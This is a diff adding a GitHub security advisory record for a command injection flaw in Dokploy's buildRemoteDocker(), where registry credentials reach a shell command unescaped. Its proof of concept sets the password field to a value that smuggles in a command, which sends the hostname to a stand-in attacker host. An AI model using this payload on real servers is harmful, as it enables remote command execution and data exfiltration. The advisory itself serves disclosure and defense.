@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-g9cg-4mmj-mh7p",
+  "repo": {
+    "cve_id": "CVE-2026-72870",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## Summary\r\n\r\nDokploy has a command injection vulnerability in the `buildRemoteDocker()` function. The Docker registry `password`, `username`, and `dockerImage` fields are interpolated directly into a shell command string without escaping, allowing an authenticated user to execute arbitrary OS commands on the Dokploy server by setting a malicious credential value and triggering a deployment.\r\n\r\nThe codebase already contains a correct mitigation: `safeDockerLoginCommand()` and `shEscape()` in `packages/server/src/services/registry.ts` perform proper single-quote escaping for the same Docker login operation. However, `buildRemoteDocker()` in `docker.ts` does not use these safe functions.\r\n\r\n## Proof of Concept\r\n\r\n```bash\r\n# Update application to use Docker source with injected password\r\ncurl -X POST \"http://TARGET/api/trpc/application.update\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -H \"Cookie: $SESSION\" \\\r\n  -d '{\r\n    \"json\": {\r\n      \"applicationId\": \"APP_ID\",\r\n      \"sourceType\": \"docker\",\r\n      \"dockerImage\": \"nginx\",\r\n      \"registryUrl\": \"registry.example.com\",\r\n      \"username\": \"user\",\r\n      \"password\": \"$(curl https://attacker.com/pwned?data=$(hostname))\"\r\n    }\r\n  }'\r\n\r\n# Trigger deployment\r\ncurl -X POST \"http://TARGET/api/trpc/application.deploy\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -H \"Cookie: $SESSION\" \\\r\n  -d '{\"json\": {\"applicationId\": \"APP_ID\"}}'\r\n\r\n```\r\n\r\n## Impact\r\n\r\n- Execute arbitrary OS commands as the Dokploy server process user (often root)\r\n",
+    "ghsa_id": "GHSA-g9cg-4mmj-mh7p",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-g9cg-4mmj-mh7p",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-g9cg-4mmj-mh7p"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72870"
+      }
+    ],
+    "published_at": "2026-07-21T23:25:09Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Command Injection via Docker Credentials in buildRemoteDocker",
+    "updated_at": "2026-08-13T17:21:19Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 0.0.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
